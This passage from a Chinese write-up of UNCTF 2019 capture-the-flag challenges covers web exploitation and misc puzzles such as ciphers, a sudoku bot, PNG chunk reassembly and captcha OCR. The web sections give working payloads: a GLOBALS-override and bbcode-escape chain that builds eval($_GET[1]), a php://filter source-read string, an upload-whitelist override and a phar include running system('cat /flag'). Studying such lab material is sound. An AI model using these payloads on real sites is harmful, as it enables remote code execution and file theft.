![](https://ctfwp.wetolink.com/2019unctf/book2/3.png)

图3 修改memo id为2的记录

再使用第一次的查询，获得flag,如图4:

![](https://ctfwp.wetolink.com/2019unctf/book2/4.png)

图4 查询出flag

### 上传给小姐姐的照片
#### 原理知识
1）	由于网站开发者在进行代码编写过程无意间错误关闭vim，导致index.php文件泄露

2）	未经过滤就使parse_str函数解析变量

#### 解题过程
1.  打开浏览器，访问index.php，发现上传点

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/487dd5cb7d8bf7d0fd8d24a479f55231.png)

2）通过python脚本扫描发现.index.php.swp文件，恢复

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/0c4369f8a782f7b076b70de6a7bdc2fe.png)

1.  审计源码，发现上传为白名单限制，且parse_str函数会将url请求参数解析成变量

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/27ba64ec6765e59c37547496f2aa9ffe.png)

1.  ?filename=pic&ext_arr[]=php覆盖原白名单

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/4ead0b96a45c8816ae00ec7053fc9fda.png)

1.  上传php一句话，利用蚁剑或菜刀连接，在web根目录发现flag文件，读取获得flag

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/28eb6415aef8a513086d382ed3a0a44e.png)

### 审计一下世界上最好的语言吧
#### 原理知识
出题的思路大概就是几个综合了几个 cms的漏洞：
+ 1.	第一个变量覆盖是灵感来自早期 dedecms 的漏洞
+ 2.	第二个是关于bbcode的是出自最近的一个漏洞，参考：
https://www.anquanke.com/post/id/182448（中文版）
https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/（这是英文版）
+ 3.	第三个漏洞是海洋cms早期的一个getshell，参考：
https://www.freebuf.com/vuls/150042.html

#### 解题过程
首先打开网页

![](https://ctfwp.wetolink.com/2019unctf/best_language/aba703f233b6730f9f82cc61861e66bc.png)

发现 source code，点击下载源码，下载后解压。

![](https://ctfwp.wetolink.com/2019unctf/best_language/95a8b27304c527dc2552e453e5bf9cfd.png)

翻翻源码，在 parse_template.php 中可以看到这几行：

![](https://ctfwp.wetolink.com/2019unctf/best_language/43d893dbe17f2a2edccf4ea1def7992a.png)

这里执行了 $strIf，我们网上看看，可以发现 strIf 是从 $iar 获取的，$iar 又是从
$content 中匹配得来的，$content
是函数的参数，先不看具体的逻辑，我们看看哪里调用了这个函数。

![](https://ctfwp.wetolink.com/2019unctf/best_language/ef0dd43bf938adc12e5ae3af1efd82ec.png)

Parse_again 调用了，这里的参数看起来都没有可控的。这里有个全局变量，第一个是：

![](https://ctfwp.wetolink.com/2019unctf/best_language/3ba5ddcca788593fca0a183bcd38f704.png)

是获取 html的值。

第二个：

![](https://ctfwp.wetolink.com/2019unctf/best_language/5bb946477ef3cb66ba4a16bc7c0e1091.png)

这里的 searchword 是从另一个字符串中匹配出来的，看起来好像没有可控的地方。

我们在 index.php 最上面发现引入了三个文件

![](https://ctfwp.wetolink.com/2019unctf/best_language/a6146f857cb828324571ad2c7801db5b.png)

看看 common.php，common.php 中上面是两个函数，下面是注册变量的代码：


![](https://ctfwp.wetolink.com/2019unctf/best_language/7b6c5c7cfaf9711adaa0b68c749b71ef.png)



这里注册了 _GET,_POST和_COOKIE 到变量里，但是在 check_var
中判断了禁止GLOBAS，所以不能直接传递 GLOBALS，我们分析一下
check_var：传进去的数组中key值不能是_GET,_POST 和 GLOBALS
这三个值，但是这里没有过滤
_COOKIE，我们可以传递这样一个get参数：_COOKIE[GLOBALS]=1

这样当第一次循环 _GET 时，_COOKIE 会被覆盖，第三次执行 _COOKIE 时就覆盖了
$GLOBALS了。

回到 index.php ：

![](https://ctfwp.wetolink.com/2019unctf/best_language/a062c43500acc7b09bb87f7a42f14851.png)

这里是 `$GLOBALS['GLOBALS']['content']`，也是我们可控的了。这个参数还经过了
parse_code，我们看看这个函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/45129cb932c1d9f5291546de629b825c.png)

执行了 $tag_parse_func 数组里的函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/868d0c4be4f429c8e412a709586a4c0a.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/60dccd5e815c17d1414c55b92186d8c8.png)

就是一段 bbcode，比如将 [b]abc[/b] 替换成 <b>abc</b>

我们再看看 index.php
中那两个注释，不难判断出这里应该是有些漏洞，可以导致标签逃逸，类似 xss的效果。

我们可以看到整个代码都做了 htmlentities 除了，只有一处：

![](https://ctfwp.wetolink.com/2019unctf/best_language/730ca14eece18032eaacbd40f7b98dbd.png)

但是这里被引号括起来了，上面又把引号替换成空了，所以单靠这里貌似也不行。于是我们留意到最后一个函数：

![](https://ctfwp.wetolink.com/2019unctf/best_language/66ce872c12a71d7a02dcc79ca0f329f4.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/3faf6a0add29528e95a7b871214e17d0.png)

这个函数就是将 [video][/video] 替换成 <video> 标签，其中判断了 host 必须是
youtube。还可以添加一些参数值。比如：

![](https://ctfwp.wetolink.com/2019unctf/best_language/43f07ca08b41a63d58b414f77707eee5.png)

![](https://ctfwp.wetolink.com/2019unctf/best_language/78603e645687a8cba92b024832ef6af1.png)

比如我们传进：[video]http://www.youtube.com?V=123[/video] 最后就会被替换成
`<video src='https://www.youtube.com/embed/123'></video>`

但是我们可以发现

![](https://ctfwp.wetolink.com/2019unctf/best_language/f3e94fd8a13e30321bb9cb671776d01a.png)

按顺序来的话，是先执行 video 解析，然后再 url解析。那么如果我们的
video传进的是：

`[video]http://www.youtube.com?v=[url]1234[/url][/video]`

先解析 video，就会变成：

`<video src='https://www.youtube.com/embed/[url]1234[/url]></video>`

然后解析 url：

```
<video src='https://www.youtube.com/embed/<a
href='1234'>1234</a>></video>
```

到这里，会发现 video 的 src
这个属性被提前闭合了，1234逃逸出来了，我们可以利用这点，把1234变成：

`></video><search>haha</search>`

然后解析成
```
<video src='https://www.youtube.com/embed/<a
href='></video><search>haha</search>'>1234</a>></video>
```


看起来我们的 search 标签成功逃逸出来了。

最终我们的payload是：
```
?_COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]></video><search>ceshi</search>[/url][/video]
```
我们可以在本地调试输出一下：

![](https://ctfwp.wetolink.com/2019unctf/best_language/d20df4c63256464ea4470bd35d907c02.png)

然后这个search 标签中的值会被带入进 parse_again
函数中。现在我们就可以来分析分析这里了。

![](https://ctfwp.wetolink.com/2019unctf/best_language/389c1f6c0007d8054b5212aa2cb04269.png)

首先分析分析parseIf 的函数，这大概就是在 $content 中匹配 `{if:abcd}1234{end if}`
这样的值，然后把 abcd的这个地方的值拿出来 eval，我们假设一下，我们可以把
template 里的值直接替换成 `{if:phpinfo()}1234{end if}`，这样就能执行了，再看看我们可以控制 template 里的哪里。

回到 parse_again 这个函数，GLOBALS
里的值我们是可控的，所以我们可以控制五个变量。但是这五个变量都被限制了，首先经过了
RemoveXSS，然后又截断了20位。我们先看看 RemoveXSS，在 common.php 中：

![](https://ctfwp.wetolink.com/2019unctf/best_language/a25d117e7a44e788f89b52a1716eb99f.png)

这里大概就是说如果匹配到了不允许的字符串，就在前两位加上 `<x>`，而我们最重要的
if: 也在里面。

这个分析完，再回到 parse_again

![](https://ctfwp.wetolink.com/2019unctf/best_language/63017bcd0d20222507804f2c43211357.png)

我们可以看到这里是顺序替换的，换种思路，我们是不是可以在 searchword 中带有
searchnum，比如：

模板文件中：

![](https://ctfwp.wetolink.com/2019unctf/best_language/c324cb7c21964fe51ca405fd9208a01a.png)

这是我们最先要替换的，替换成 $searchword，

我们把 $searchword 的值设为 `1{haha:searchnum}`，那么下次替换 $searchnum
的时候，比如我们的 searchnum 的值是 2，那么替换完就是 12，如果我们的1是
if，而他removexss 匹配得是 if: (if+冒号)，这时候就不会被检测到。

也就是说我们可以一点一点替换，最后达到：`{if:phpinfo()}1234{end if}`

给出我们的payload：

```
_COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]></video><search>{if{haha:searchnum}}</search>[/url][/video]

_COOKIE[GLOBALS][searchnum]=:eva{haha:type}

_COOKIE[GLOBALS][type]=l($_G{haha:typename}

_COOKIE[GLOBALS][typename]=ET[1])

1=phpinfo();
```

首先，我们匹配到的searchword是`{if{haha:searchnum}}`，然后进行替换，

一开始模板中的值为 `{haha:searchword}`，

第一次把 searchword替换上去后，值变成了：`{if{haha:searchnum}}`

然后第二次会替换 searchnum，变成了：`{if:eva{haha:type}}`

第三次替换 type：`{if:eval($_G{haha:typename}}`

最后一个替换typename：`{if:eval($_GET[1])}`

这就完成了，然后这个值会被传到 parseIf 中，通过正则表达式匹配出来，

![](https://ctfwp.wetolink.com/2019unctf/best_language/8618d098e1cdb1971782003f8e1dfa64.png)

因为 `{end if}` 在模板中其他位置是有的， 所以我们不用构造。

匹配出来的值就是`eval($_GET[1])`，然后被带入到 eval中，执行代码：

![](https://ctfwp.wetolink.com/2019unctf/best_language/1ee34114765e62616f55d8b7a76288f8.png)


### 这好像不是上传
#### 原理知识
1）	Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了
2）	利用phar包含自定义的脚本

#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

![](https://ctfwp.wetolink.com/2019unctf/not_upload/52e18a9254207f5b2bac996484ec653f.png)

1.  根据提示后,考虑到有隐藏信息,随后在源码中发现提示

![](https://ctfwp.wetolink.com/2019unctf/not_upload/dd3dab6c35c6bc4110e1dbd9d911ca17.png)

1.  可以发现一个文件包含的功能,于是查看了something.php

![](https://ctfwp.wetolink.com/2019unctf/not_upload/592afcee0aefe8d568da8b4dd87a1ed3.png)

1.  继续访问upload.php,得到一下内容.

![](https://ctfwp.wetolink.com/2019unctf/not_upload/1f99a809a6cb552bba40fe2a8ffe35d4.png)

1.  尝试上传,发现又能上传txt的文件,即使上传其他文件后,文件后缀也会被改为txt文件,

2.  在这里选手可能会想到通过index的文件包含进行攻击,但是当使用index的文件包含的时候,会出现如下提示

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d864a671b9af88cf9c6c2dee9db5fbaa.png)

1.  在这里需要选手发现upload文件里面也有注释提示,因为考虑了新生水平,这里直接给出了考点为phar,需要选手自行搜索关于phar的知识

![](https://ctfwp.wetolink.com/2019unctf/not_upload/548927085f0c617d1a9de1a60e71111f.png)

1.  当选手知道phar是什么之后,会想到哪里有包含,这个时候很容易想到index里面有包含,但是index源码禁止了phar协议,而且做出了足够提示有东西在upload.php里面

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d4dabe7d0d0e7353abc1831835ea8d59.png)

![](https://ctfwp.wetolink.com/2019unctf/not_upload/1301f5aca7f27342d9eb3246d97ae94a.png)

1.  所以选手需要知道upload.php里面还有东西,又考虑到index.php的包含功能,可以采用php://filter协议读取任意文件,我们这个时候读取upload.php的源码(payload:
    php://filter/convert.base64-encode/resource=upload.php)

![](https://ctfwp.wetolink.com/2019unctf/not_upload/5973983b5a8f2d903ca496182a8a6b6c.png)

1.  Base64解密后,可以发现upload的所有源码,其中也有一个没有限制的文件包含

![](https://ctfwp.wetolink.com/2019unctf/not_upload/5242ef90ca083e465b59abcd43624ff0.png)

1.  所以了解phar和webshell是什么后,我们思路就清晰了,这个时候上传我们的phar文件

![](https://ctfwp.wetolink.com/2019unctf/not_upload/d54d288a2b8b8962c7d8d821724bc730.png)

1.  利用upload的里面的file包含我们的文件(其中包含 `<?php echo system("cat /flag"));?>`),即可拿到flag

![](https://ctfwp.wetolink.com/2019unctf/not_upload/319549cb068274f08c3a46d76e032b31.png)

## MISC
### BACON
#### 原理知识
培根密码
#### 解题过程
1）打开浏览器，访问目标主机下载压缩包
2）打开压缩包，可以发现有一个txt文件，打开后可以看到其中内容如下：

![](https://ctfwp.wetolink.com/2019unctf/BACON/1.png)

可以看到字符由ab构成，可以猜到是培根密码，通过解密可得密码：fox
### EasyBox
#### 原理知识
1）	深度优先搜索算法（英语：Depth-First-Search，简称DFS）是一种用于遍历或搜索树或图的算法。 沿着树的深度遍历树的节点，尽可能深的搜索树的分支。当节点v的所在边都己被探寻过或者在搜寻时结点不满足条件，搜索将回溯到发现节点v的那条边的起始节点。整个进程反复进行直到所有节点都被访问为止。属于盲目搜索,最糟糕的情况算法时间复杂度为O(!n)。
2）	Pwntools提供了方便的网络交互编程的接口

#### 解题过程
1）使用nc连接到靶机开放端口。

2）返回结果如下所示，可以看出是一个数独之类的游戏，但是交互时间很短，只能通过编写脚本来完成：

![](https://ctfwp.wetolink.com/2019unctf/EasyBox/a03a5bbb9f5402c7031ae599037e2c8e.png)

1.  利用dfs（深度优先搜索算法）来编写计算数独空缺数字脚本，根据题目提示，这个数独只需要横向和纵向的数字和为45，并且1-9只能出现一次，部分脚本如下所示：

![](https://ctfwp.wetolink.com/2019unctf/EasyBox/ff613f3a86b83a67e555034a7d2ef7c5.png)

1.  exp.py使用pwntools库负责接收数据和发送数据，solve.py负责将数据整理并利用

exp.py

```
#coding:utf-8
from pwn import *
import datetime
import sovle

#context.log_level='debug'

p=remote('123.206.21.178',10000)

shudu=[]
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
print shudu
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))
p.recvuntil("+-+-+-+-+-+-+-+-+-+")
p.recvuntil("|")
shudu.append(p.recv(17).strip("\n").split('|'))

res=[]
for i in range(9):
	res.append(['0' if x==' ' else x for x in shudu[i]])

m=''

for i in range(9):
	for j in range(9):
		res[i][j]=int(res[i][j])
		if res[i][j]==0:
			m+=str(i)+'.'+str(j)+' '
print res
m = m[:-1].split(' ')
print m
res = sovle.start(res)


answer=[]
for i in range(9):
	s=''
	for x in m:
		if i == int(x[0]):
			s += str(res[int(x[0])][int(x[2])])+' '
	answer.append(s[:-1])

print answer

p.recv()

for i in answer:
	payload = i.replace(' ',',')
	print payload
	p.sendline(payload)

p.recvuntil('')
p.interactive()
```

solve.py

```
#coding:utf-8
 
def my_dfs(A):
    result=[]
    ALL_SET=set({1,2,3,4,5,6,7,8,9,0})#全集
    for i in range(9):
        for j in range(9):
            if A[i][j]==0:
                d={}
                set_x=set(A[i][k] for k in range(9))#横向的集合
                set_y=set(A[k][j] for k in range(9))#纵向的集合
                set_x_y=set_x|set_y
                data=list(ALL_SET-set_x_y)#总的集合-横向纵向的集合=可能解的集合
                d['%s,%s'%(str(i),str(j))]=data
                result.append(d)
    return result
 
#判断数独中是否含有未确定的数字
def check(A):
    flag=False
    for i in range(9):
        for j in range(9):
            if A[i][j] is 0:
                flag=True
    #A中有0为True
    return flag

def start(A):
    count=1
    while check(A):
        data=my_dfs(A)
        for each in data:
            for index,item in each.items():
                if len(item)==1:#如果可能解只有一个，那么该点就是这个解
                    i,j=index.split(',')
                    A[int(i)][int(j)]=item[0]#将这个解赋值给该点
        count+=1
    return A

if __name__=='__main__':
    A=[[0, 8, 9, 0, 1, 6, 0, 2, 0], 
   [8, 0, 3, 0, 4, 0, 7, 0, 6], 
   [7, 1, 2, 9, 0, 8, 0, 4, 5], 
   [4, 7, 0, 6, 9, 5, 3, 1, 2], 
   [0, 6, 7, 0, 8, 4, 2, 9, 0], 
   [0, 0, 0, 4, 7, 0, 0, 0, 9], 
   [0, 0, 5, 3, 6, 0, 0, 7, 0], 
   [0, 0, 0, 0, 5, 1, 8, 6, 7], 
   [6, 9, 1, 8, 2, 7, 0, 0, 4]]
    print start(A)
```

深度优先搜索算法来得出空缺的数字，最后由exp.py发送，结果如下：

![](https://ctfwp.wetolink.com/2019unctf/EasyBox/cdee140aa83245af42f2e6effa61a140.png)

### Happy_puzzle
#### 原理知识
1）	PNG便携式网络图形是一种无损压缩的位图片形格式，其设计目的是试图替代GIF和TIFF文件格式，同时增加一些GIF文件格式所不具备的特性。PNG使用从LZ77派生的无损数据压缩算法，一般应用于JAVA程序、网页或S60程序中，原因是它压缩比高，生成文件体积小。

#### 解题过程
1.  下载题目到本地，打开压缩包发现很多data文件如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/Happy_puzzle/90776adb86041c9b6047d2bc25950c14.png)

图1 data文件

1.  由文件夹中的info.txt可知，这些data数据块是由图片格式为400 X
    400的png图片拆卡得到的，

2.  分析 `*.data (10240 * N + 5214)` ，推测这些data是IDAT
    数据块，编写脚本将数据块组合到一起，部分脚本如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/Happy_puzzle/26f40782688bf3c1f5877bedbc40b32c.png)

exp.py

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/08/28, 18:00
"""

import os
import sys
import binascii
import zlib

OUTPUT = 'puzzle'


def bin2hex(data):
    return binascii.b2a_hex(data)


def hex2bin(data):
    return binascii.a2b_hex(data)


def dec2bin(data, l=1):
    l = l / 2
    if l == 4:
        return hex2bin("%08x" % int(data))
    else:
        return hex2bin("%02x" % int(data))


def bin2dec(data):
    return int(bin2hex(data), 16)


def crc32(chunkType, chunkData):
    return dec2bin(binascii.crc32(chunkType + chunkData), 8)


def genIHDR(w, h):
    width = dec2bin(w, 8)
    height = dec2bin(h, 8)
    bits = dec2bin(8)
    color_type = dec2bin(2)
    compr_method = filter_method = interlace_method = dec2bin(0)
    chunkData = width+height+bits+color_type + \
        compr_method+filter_method+interlace_method
    res = dec2bin(len(chunkData), 8)+b'IHDR' + \
        chunkData+crc32(b'IHDR', chunkData)
    print([res])
    return res


def genIDAT(data):
    _c = zlib.crc32(b'IDAT'+data)
    if _c < 0:
        _c = ~_c ^ 0xffffffff
    _crc = dec2bin(_c, 8)
    return dec2bin(len(data), 8) + b'IDAT' + data + _crc


def merge_png(width, height, names, output="tmp.png"):
    header = hex2bin("89504E470D0A1A0A")
    ihdr = genIHDR(width, height)
    idat = []
    for name in names:
        f=open("%s/%s" % (OUTPUT, name),'rb')
        data = f.read()
        idat.append(genIDAT(data))
        f.close()
    idat = b''.join(idat)
    iend = hex2bin("00000000" + "49454E44" + "AE426082")
    with open(output, 'wb') as f:
        f.write(header+ihdr+idat+iend)


if __name__ == '__main__':
    fs = ["blczioav.data", "ciaoxptf.data", "csizrgxn.data", "dwelszrk.data", "fhnkotmb.data", "fkjhepcs.data", "gpiuezjw.data", "hbctmwqj.data", "jlxphwfm.data", "jrbiznkl.data", "jtxsbevz.data", "kczwtlrd.data", "lstjobzi.data",
          "mrxtfkzj.data", "oaeqnubi.data", "pyusgabf.data", "rnydeiho.data", "tihzkoyu.data", "uilqywot.data", "uozjmdnl.data", "wgkapjbh.data", "xufbyndk.data", "xufnmacj.data", "ycqzmbrw.data", "yscijlzx.data", "yvxmeawg.data"]
    merge_png(400, 400, ['yvxmeawg.data',
                             'rnydeiho.data','uozjmdnl.data',
                             "fhnkotmb.data",'jlxphwfm.data',
                             'yscijlzx.data','ciaoxptf.data',
                             'blczioav.data','jtxsbevz.data',
                             'lstjobzi.data','pyusgabf.data',
                             'wgkapjbh.data','xufbyndk.data',
                             'csizrgxn.data','oaeqnubi.data',
                             'gpiuezjw.data','tihzkoyu.data',
                             'hbctmwqj.data','ycqzmbrw.data',
                             'fkjhepcs.data','kczwtlrd.data',
                             'dwelszrk.data','uilqywot.data',
                             'xufnmacj.data','jrbiznkl.data',
                             'mrxtfkzj.data'], "%s.png" % "flag")


    # for f in fs:
    #     merge_png(400, 400, ['yvxmeawg.data',
    #                          'rnydeiho.data','uozjmdnl.data',
    #                          "fhnkotmb.data",'jlxphwfm.data',
    #                          'yscijlzx.data','ciaoxptf.data',
    #                          'blczioav.data','jtxsbevz.data',
    #                          'lstjobzi.data','pyusgabf.data',
    #                          'wgkapjbh.data','xufbyndk.data',
    #                          'csizrgxn.data','oaeqnubi.data',
    #                          'gpiuezjw.data','tihzkoyu.data',
    #                          'hbctmwqj.data','ycqzmbrw.data',
    #                          'fkjhepcs.data','kczwtlrd.data',
    #                          'dwelszrk.data','uilqywot.data',
    #                          'xufnmacj.data','jrbiznkl.data',
    #                          'mrxtfkzj.data',f], "%s.png" % f)

```

1.  最后逐个数据块测试 HEADER + IHDR + IDAT1
    [+IDAT2...]，详细exp.py，一个一个测试可以看到已经拼出得图像，如下图所示，名称为yvxmeawg.data，在第一张的基础上往后去试第二张，以此类推：

![](https://ctfwp.wetolink.com/2019unctf/Happy_puzzle/abb94bae246f30380e749c6b80453eab.png)

图3 第一张

最后复原完成的效果如下图所示：

![IMG_256](https://ctfwp.wetolink.com/2019unctf/Happy_puzzle/8f5b52a535fbd14f7de44c51b4121156.png)

图4 最终版

### Think
#### 原理知识
1）	Python的lambda一般形式是关键字lambda后面跟一个或多个参数，紧跟一个冒号，以后是一个表达式。lambda是一个表达式而不是一个语句。它能够出现在Python语法不允许def出现的地方。作为表达式，lambda返回一个值（即一个新的函数）。lambda用来编写简单的函数，而def用来处理更强大的任务。
#### 解题过程
1.  下载题目，打开是一个python脚本，如下图1所示：

![](https://ctfwp.wetolink.com/2019unctf/Think/67aa00081e5e58256172488958d42b73.png)

1.  虽然代码很长，但是可以一点点分解开分析，如图所示：

![](https://ctfwp.wetolink.com/2019unctf/Think/bfae4053773b101d988a23594d8729a5.png)

1.  根据分解的代码内容可以推测出本题使用了异或加密，并且key为unctf，而密文就是那一长的字符串列表，可以推测下是密文解base64后，再hex转为字符串再和key按位异或得到flag，详细见exp脚本：

exp.py

```
#coding:utf-8

(lambda __y, __operator, __g, __print: [[[[(__print("It's a simple question. Take it easy. Don't think too much about it."), [(check(checknum), None)[1] for __g['checknum'] in [(1)]][0])[1] for __g['check'], check.__name__ in [(lambda checknum: (lambda __l: [(lambda __after: (__print('Congratulation!'), (__print(decrypt(key, encrypted)), __after())[1])[1] if __l['checknum'] else (__print('Wrong!'), __after())[1])(lambda: None) for __l['checknum'] in [(checknum)]][0])({}), 'check')]][0] for __g['decrypt'], decrypt.__name__ in [(lambda key, encrypted: (lambda __l: [[(lambda __after, __sentinel, __items: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['c'] in [(__operator.iadd(__l['c'], chr((ord(__l['key'][(__l['i'] % len(__l['key']))]) ^ ord(__l['encrypted'][__l['i']].decode('base64').decode('hex'))))))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(lambda: __l['c'], [], iter(range(len(__l['encrypted'])))) for __l['c'] in [('')]][0] for __l['key'], __l['encrypted'] in [(key, encrypted)]][0])({}), 'decrypt')]][0] for __g['encrypted'] in [(['MTM=', 'MDI=', 'MDI=', 'MTM=', 'MWQ=', 'NDY=', 'NWE=', 'MDI=', 'NGQ=', 'NTI=', 'NGQ=', 'NTg=', 'NWI=', 'MTU=', 'NWU=', 'MTQ=', 'MGE=', 'NWE=', 'MTI=', 'MDA=', 'NGQ=', 'NWM=', 'MDE=', 'MTU=', 'MDc=', 'MTE=', 'MGM=', 'NTA=', 'NDY=', 'NTA=', 'MTY=', 'NWI=', 'NTI=', 'NDc=', 'MDI=', 'NDE=', 'NWU=', 'MWU='])]][0] for __g['key'] in [('unctf')]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('operator', level=0), globals(), __import__('__builtin__', level=0).__dict__['print'])

key="unctf"
encrypted=['MTM=', 'MDI=', 'MDI=', 'MTM=', 'MWQ=', 'NDY=', 'NWE=', 'MDI=', 'NGQ=', 'NTI=', 'NGQ=', 'NTg=', 'NWI=', 'MTU=', 'NWU=', 'MTQ=', 'MGE=', 'NWE=', 'MTI=', 'MDA=', 'NGQ=', 'NWM=', 'MDE=', 'MTU=', 'MDc=', 'MTE=', 'MGM=', 'NTA=', 'NDY=', 'NTA=', 'MTY=', 'NWI=', 'NTI=', 'NDc=', 'MDI=', 'NDE=', 'NWU=', 'MWU=']


def decrypt(key,encrypted):
	c=''
	for i in range(len(encrypted)):
		c += chr(ord(key[i%len(key)]) ^ ord(encrypted[i].decode('base64').decode('hex')))
	return c

def check(checknum):
	if checknum:
		print("Congratulation!")
		print decrypt(key,encrypted)
	else:
		print("Wrong!")

print("It's a simple question. Take it easy. Don't think too much about it.")
checknum=1
check(checknum)
```

![](https://ctfwp.wetolink.com/2019unctf/Think/111a9d0d06436d74619d7a8dbcb8495a.png)

1.  本题的快捷解法是直接修改checknum为1，这样通过判断就可以直接得到flag，位置如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/Think/d2131fa6bc1b9fc72d3af7e67e0e0148.png)

1.  最终结果为：

![](https://ctfwp.wetolink.com/2019unctf/Think/8c1efb553e70d133299f224433beae4a.png)


### 安妮 起源
#### 原理知识
1）	猪圈密码，银河语言，摩斯电码
#### 解题过程
1）打开浏览器，访问目标主机下载压缩包
2）打开程序，运行到最后一步，可以看到是猪圈密码，解码后进入下一步
3）打开下一个程序，运行到最后一步，可以看到是摩斯电码，解码后进入下一步
4）打开下一个程序，运行到最后一步，可以看到是银河语言，解码后进入下一步
5）打开程序后，运行到最后一步得到flag

### 贝斯的图
#### 原理知识
1）	将图片转换为Base64编码，可以让很方便地在没有上传文件的条件下将图片插入其它的网页、编辑器中。 这对于一些小的图片是极为方便的，因为不需要再去寻找一个保存图片的地方。
2）	在HTML中插入图片的时候，只需要填写代码为<img src="data:image/png;base64,iVBORw0KGgo=..." />

#### 解题过程

1.  使用file命令分析文件，发现是txt

![](https://ctfwp.wetolink.com/2019unctf/Base/76cd6eb9edcb4d42dad9b48d4f0b45dc.png)

1.  修改后缀直接查看

![](https://ctfwp.wetolink.com/2019unctf/Base/84d68bb3abb5f6f33799b00ead353bdd.png)

1.  标准的base64编码，搜索在线解密或者直接写一个html文档转换得到图片

![](https://ctfwp.wetolink.com/2019unctf/Base/793f8af4f98e0fecb3f2fd53c22c52b0.png)

1.  扫码得到base64

![](https://ctfwp.wetolink.com/2019unctf/Base/9000b6a21e2570d9f7d6800c8abfacbb.png)

1.  解码得到flag

unctf{base64&image}

### 超速计算器
#### 原理知识
1）	使用深度学习训练验证码识别模型很方便，速度也很快。

2）	数据集的生成或标注方法 

3）	python进行http请求处理的方法

#### 解题过程
1）问题分析 

打开首页，是一道计算器的题目，需要计算表达式，并提交结果，如[图1](#org882cde5)。

因为表达式是图片，需要先识别图片，再执行表达式计算结果。如果要训练模型需要大量的标注数据，看看能不能

自己生成验证码数据进行训练，会方便很多。

![](https://ctfwp.wetolink.com/2019unctf/very_fast_computer/558aaa19144d43b670235bff8572b535.png)

访问/robots.txt,看到有一个code.py文件禁止爬虫访问，访问code.py，是生成验证码的代码。在代码中有用到Chopsic.ttf,访问/Chopsic.ttf获取到字体文件。然后使用code.py就可以本地生成验证码。

2）验证码识别 

使用现成的captcha项目生成模型，这里使用*captcha_trainer*进行识别,支持不定长字符的识别。
按照说明下载代码，安装依赖。

1.数据集的准备

使用python脚本生成图片文件，文件名为验证码图片的文字：
```
import os
from code import gen_exp_pic


def make_dataset(pic_path, count=10000):
    os.makedirs(pic_path, exist_ok=True)
    for i in range(count):
        r = gen_exp_pic()
        target_file = os.path.join(pic_path, r[1]+"_.jpg")
        r[0].save(target_file)


datasets_dir = "datasets/"

make_dataset(datasets_dir, count=5000)
```

生成dataset图片之后，再使用python
make_dataset.py生成测试和训练数据集。在生成数据集之前要先配置模型信息:
```
# - requirement.txt - GPU: tensorflow-gpu, CPU: tensorflow

# - If you use the GPU version, you need to install some additional
applications.

System:

DeviceUsage: 0.9

# ModelName: Corresponding to the model file in the model directory,

# - such as YourModelName.pb, fill in YourModelName here.

# CharSet: Provides a default optional built-in solution:

# - [ALPHANUMERIC, ALPHANUMERIC_LOWER, ALPHANUMERIC_UPPER,

# -- NUMERIC, ALPHABET_LOWER, ALPHABET_UPPER, ALPHABET,
ALPHANUMERIC_LOWER_MIX_CHINESE_3500]

# - Or you can use your own customized character set like: ['a', '1', '2'].

# CharMaxLength: Maximum length of characters， used for label padding.

# CharExclude: CharExclude should be a list, like: ['a', '1', '2']

# - which is convenient for users to freely combine character sets.

# - If you don't want to manually define the character set manually,

# - you can choose a built-in character set

# - and set the characters to be excluded by CharExclude parameter.

Model:

Sites: [

'ocr3step'

]

ModelName: ocr3step

ModelType: 400x32

# 支持的字符集，这里要识别的运算符号只有+*-

CharSet: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '*', '-']

# 识别的最长字符数

CharMaxLength: 11

CharExclude: []

CharReplace: {}

ImageWidth: 400

ImageHeight: 32

# Binaryzation: [-1: Off, >0 and < 255: On].

# Smoothing: [-1: Off, >0: On].

# Blur: [-1: Off, >0: On].

# Resize: [WIDTH, HEIGHT]

# - If the image size is too small, the training effect will be poor and you
need to zoom in.

# ReplaceTransparent: [True, False]

# - True: Convert transparent images in RGBA format to opaque RGB format,

# - False: Keep the original image

Pretreatment:

Binaryzation: -1

Smoothing: -1

Blur: -1

Resize: [400, 32]

ReplaceTransparent: True

# CNNNetwork: [CNN5, ResNet, DenseNet]

